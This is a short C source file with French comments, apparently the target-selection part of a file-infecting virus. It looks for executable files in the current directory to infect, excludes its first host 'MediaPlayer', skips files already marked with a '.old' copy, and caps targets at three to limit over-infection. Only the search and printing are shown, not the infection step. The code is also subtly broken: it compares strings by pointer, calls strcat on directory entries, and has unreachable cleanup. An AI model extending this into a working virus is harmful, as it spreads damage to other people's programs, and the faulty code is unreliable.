#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <stdbool.h>

bool dejaInfecte(char* nomFichier)
{
	char * extension = ".old";
	if(strstr(nomFichier, extension)){ //Si contient l'extension .old --> Déjà infecté
		return true;
	}else{
		DIR *rep = opendir("."); 
		struct dirent *lecture;
		while ((lecture = readdir(rep))) {
			if((lecture->d_name == nomFichier) && fopen(strcat(lecture->d_name,extension),"r")!=NULL){
				return true;
			}
		}
	}
	return false;
}

char** searchFiles()
{
	char** files = malloc(3*sizeof(char*));
	int cpt=0;
	DIR *rep = opendir("."); //Repertoire courant
	struct stat buf;
	struct dirent *lecture;
	printf("fichier(s) executable(s) :\n");
	while ((lecture = readdir(rep))) { //Contenu du repertoire
		stat(lecture->d_name,&buf);
		if(((buf.st_mode & S_IFMT) == S_IFREG) && (buf.st_mode & S_IXUSR))
		{ //si fichier régu && executable
			if(cpt<3 && strcmp(lecture->d_name,"MediaPlayer")!=0 && !dejaInfecte(lecture->d_name)) 
			{//On ne prend que 3 fichier (lutter contre la sur-infection), et pas le premier hôte
				printf("  - %s\n", lecture->d_name);
				files[cpt] = lecture->d_name;
				cpt+=1;
			}
		}
        }
	return files;
	closedir(rep);
}



int main()
{
	char** f = searchFiles();
	for(int i=0;i<3;i+=1){
		char* s = f[i];
		printf("fichier : %s\n", s);
	}
}
